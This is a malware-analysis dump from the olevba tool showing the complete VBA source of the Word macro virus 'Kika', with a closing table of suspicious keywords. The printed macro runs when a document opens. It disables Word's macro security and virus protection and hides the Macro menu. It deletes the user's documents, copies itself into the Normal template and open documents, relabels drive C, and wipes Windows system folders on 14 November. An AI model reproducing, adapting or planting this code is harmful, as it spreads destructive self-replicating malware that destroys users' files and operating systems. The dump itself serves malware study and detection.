olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kika-f2c9e4d3f97ec484463494af1c2a44a48bf5becf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO KIKA.cls 
in file: Virus.MSWord.Kika-f2c9e4d3f97ec484463494af1c2a44a48bf5becf - OLE stream: 'Macros/VBA/KIKA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Application.ShowVisualBasicEditor = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\security", "Level") = 1&
CommandBars("Tools").Controls("Macro").Visible = False
Options.VirusProtection = (1 - 1)
Options.ConfirmConversions = (1 - 1)
Options.SaveNormalPrompt = False
Application.EnableCancelKey = wdCancelDisabled
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\", "kikaviruz") <> "by BAMBAM" Then
Kill ("c:\Mis documentos\*.*")
Kill ("C:\My documents\*.*")
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\", "kikaviruz") = "by BAMBAM"
Set FRED = ActiveDocument.VBProject.VBComponents.Item(1)
Set PETER = NormalTemplate.VBProject.VBComponents.Item(1)
Shell ("LABEL C: KIKA"), vbMinimizedNoFocus
BETY = PETER.Codemodule.CountOFlines
BILMA = FRED.Codemodule.CountOFlines
bambam = 2
If FRED.Name <> "KIKA" Then
 If BILMA > 0 Then FRED.Codemodule.Deletelines 1, BILMA
    Set Ainfectar = FRED
    FRED.Name = "KIKA"
    hacerAD = True
    PEBELLS = PEBELLS + (Chr(65 + Int(Rnd * 26)))
End If
If PETER.Name <> "KIKA" Then
If BETY > 0 Then PETER.Codemodule.Deletelines 1, BETY
     Set Ainfectar = PETER
     PETER.Name = "KIKA"
     hacerNT = True
     PEBELLS = PEBELLS + (Chr(65 + Int(Rnd * 22)))
End If
If hacerNT <> True And hacerAD <> True Then GoTo byebye
 If hacerNT = True Then
Do While FRED.Codemodule.Lines(1, 1) = ""
  FRED.Codemodule.Deletelines 1
  PEBELLS = PEBELLS + (Chr(65 + Int(Rnd * 22)))
 Loop
 Ainfectar.Codemodule.AddFromstring ("Private Sub Document_Close()")
 Do While FRED.Codemodule.Lines(bambam, 1) <> ""
   Ainfectar.Codemodule.insertlines bambam, FRED.Codemodule.Lines(bambam, 1)
   bambam = bambam + 1
Loop
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("Sub ViewVbCode()")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("On Error Resume Next")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("MsgBox ") + (Chr(34) + "Its KIKA VIRUZ    Ja,ja,ja...  : )" + Chr(34)) + "," + "vbokoNLY," + Chr(34) + "Alt-F11  hmmm..." + Chr(34)
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("End Sub")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("Sub HelpAbout()")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("On Error Resume Next")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("MsgBox ") + ((Chr(34) + "Sorry " + (Chr(34)) + "+" + "Application.UserName" + "+" + (Chr(34)) + ", but... you have KIKA VIRUZ by BAMBAM. (c)copywrong. " + Chr(34)))
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("End sub")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("Sub ToolsMacro()")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("On Error Resume Next")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("MsgBox") + (Chr(34)) + "I know you  " + (Chr(34) + "+" + "application.username" + "+" + Chr(34) + " and i'm observing you " + Chr(34))
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("End Sub")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("Sub FileTemplates()")
bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("On Error Resume Next")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("End Sub ")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("Sub help()")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("On error resume next")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("Assistant.Visible = True")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, (" With Assistant.NewBalloon")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, (".Heading ") + "=" + Chr(34) + ("Que crees?") + Chr(34)
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, (".Text") + "=" + Chr(34) + ("Creo que tienes el Kika.") + Chr(34) + "+" + "Chr(13)" + "+" + Chr(34) + ("Pero no te preocupes...") + Chr(34)
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, (".Show")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("End With")
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("End Sub")
 End If
 If hacerAD = True Then
 Do While PETER.Codemodule.Lines(1, 1) = ""
  PETER.Codemodule.Deletelines 1
  PEBELLS = PEBELLS + (Chr(65 + Int(Rnd * 22)))
Loop
Ainfectar.Codemodule.AddFromstring ("Private Sub Document_Open()")
Do While PETER.Codemodule.Lines(bambam, 1) <> "End Sub"
Ainfectar.Codemodule.insertlines bambam, PETER.Codemodule.Lines(bambam, 1)
  bambam = bambam + 1
 Loop
 bambam = bambam + 1
 Ainfectar.Codemodule.insertlines bambam, ("End Sub ")
End If
byebye:
PEBELLS2 = PEBELLS2 + (Chr(65 + Int(Rnd * 26)))
If BETY <> 0 And BILMA = 0 And (InStr(1, ActiveDocument.Name, "DOcument") = False) Then
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
  ActiveDocument.Saved = True
End If
If Minute(Time) > 55 Then
   Selection.TypeText "Dedicated to the most wonderful woman in the universe... "
End If
If Day(Date) = 14 And Month(Date) = 11 Then
   Kill ("c:\windows\*.*")
   Kill ("C:\windows\system\*.*")
   Kill ("C:\windows\system32\*.*")
   Kill ("C:\winnt\*.*")
   Kill ("C:\winnt\system\*.*")
   MsgBox "Today is BAMBAM's birthday... "
End If
'Este es un "virus" desarrollado en México
'Espero que les guste ¿!!!!?
'Creado con lo mejor de algunos virus Mellisa,Groovie,Xix...
'Decdicado a la mujer mas maravillosa del Universo
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedNoFocus  |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

